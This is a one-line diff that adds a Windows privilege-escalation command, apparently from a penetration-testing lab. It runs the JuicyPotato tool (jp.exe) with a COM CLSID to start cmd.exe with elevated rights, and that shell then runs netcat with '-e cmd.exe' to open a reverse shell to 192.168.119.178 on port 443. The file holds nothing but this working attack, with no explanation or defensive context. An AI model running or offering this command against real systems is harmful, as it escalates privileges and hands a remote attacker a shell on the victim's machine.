@@ -1,0 +1,1 @@
+jp.exe -l 1337 -c "{E48EDA45-43C6-48e0-9323-A7B2067D9CD5}" -p c:\windows\system32\cmd.exe -a "/c c:\users\alice\documents\nc.exe -e cmd.exe 192.168.119.178 443" -t *
